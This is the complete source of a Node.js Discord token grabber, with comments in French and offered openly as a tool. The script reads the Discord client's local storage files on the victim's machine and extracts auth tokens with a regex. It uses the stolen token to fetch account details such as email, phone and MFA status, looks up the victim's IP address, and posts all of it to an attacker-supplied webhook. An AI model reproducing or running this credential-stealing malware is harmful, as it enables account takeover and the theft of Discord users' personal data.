const { readdirSync, readFileSync } = require('fs');
const { homedir } = require('os');
const { join } = require('path');
const request = require('request');

const WEBHOOK = "Votre URL";

//Discord
const path = join(homedir(), "AppData", "Roaming", "discord", "Local Storage", "leveldb");

/* Discord Canary
const path2 = join(homedir(), "AppData", "Roaming", "discordcanary", "Local Storage", "leveldb");
*/

let [...files] = readdirSync(path);

function Grabber() {
    return new Promise(async(resolve, reject) => {
        let result; let tokens = []; let i = 0;
        for await(const file of files) {
            if(String(file.split(".").pop()) == "log") { 
                const Fpath = join(path, file);
                const content = readFileSync(Fpath);
                const match = String(content).match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)[0]
                if(match) {
                    await request('https://discordapp.com/api/v8/users/@me', { method: 'GET', headers: { 'Authorization': match } }, (err, _, body) => {
                        if(!err) {
                            result = JSON.parse(body);
                            tokens.push(match);
                            i++;
                            if(i == files.length) { resolve({ result: result, tokens: tokens }); }
                            /*
                                Flemme de faire pour tous les tokens :)
                                Si vous voulez pas que le premier token alors changer un peu le code !
                            */
                            return resolve({ result: result, tokens: tokens });
                        } else {i++;}
                    });
                } else {i++;}
            } else {i++;}
        }
    })
}

const IP = async () => {
    return new Promise((resolve, reject) => {
        request('https://api.ipify.org/', (err, res, body) => resolve(body));
    });
}

(async function() {
   const result = await Grabber();
   const ip = await IP();
   const phone = result.result.phone ? result.result.phone : "Aucun";
   const params = {
        username: "Token Grabber",
        avatar_url: "https://static.hitek.fr/img/actualite/top-chat-journee-internationale7.jpg",
        content: "",
        embeds: [
            {
                "color": 3092790,
                "author": {
                    "name": result.result.username,
                    "icon_url": "https://cdn.discordapp.com/avatars/" + result.result.id + "/" + result.result.avatar
                },
                "footer": { "text": "Créé par Dieu... ou pas." },
                "fields": [
                    { "name": "ID:", "value": result.result.id, "inline": true },
                    { "name": "Discriminator:", "value": "#" + result.result.discriminator, "inline": true },
                    { "name": "Locale:", "value": result.result.locale, "inline": true },
                    { "name": "Nsfw:", "value": result.result.nsfw_allowed, "inline": true },
                    { "name": "MFA:", "value": result.result.mfa_enabled, "inline": true },
                    { "name": "Email:", "value": result.result.email, "inline": true },
                    { "name": "Verified:", "value": result.result.verified, "inline": true },
                    { "name": "Phone:", "value": phone, "inline": true },
                    { "name": "IP:", "value": ip, "inline": true },
                    { "name": "Token:", "value": result.tokens[0], "inline": false },
                ]
            }
        ]
   }
   request(WEBHOOK, { 
       method: 'POST',
       headers: {
           'Content-type': 'application/json'
       },
       body: JSON.stringify(params)
   }, () => process.exit());
})();
